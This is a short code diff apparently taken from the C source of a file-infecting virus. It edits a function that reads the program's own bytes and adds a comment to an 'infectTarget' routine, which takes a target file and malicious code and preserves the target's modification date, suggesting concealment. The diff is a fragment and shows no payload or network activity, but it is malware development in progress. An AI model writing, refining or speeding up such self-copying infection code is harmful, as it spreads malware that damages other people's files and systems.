@@ -33,7 +33,7 @@ unsigned int getOwnBytes(char** bytes, const char* arg0){
 	fseek(self_fp,0,SEEK_SET);
 	
 	//Get own bytes
-	(*bytes)=(char*)malloc(sizeof(char)*size);
+	*bytes=(char*)malloc(sizeof(char)*size);
 	fread(*bytes,1,size,self_fp);
 	
 	//Clean up
@@ -46,7 +46,9 @@ unsigned int getOwnBytes(char** bytes, const char* arg0){
 
 
 bool infectTarget(const char* target, const char* malcode, unsigned int malsize){
-	
+	/*This function can be reduced and sped up bytes
+	not reading from the target file and blindly replacing
+	bytes*/
 	//Get target modify date
 	int64_t tardate=getFileModifiedDate(target);
 	
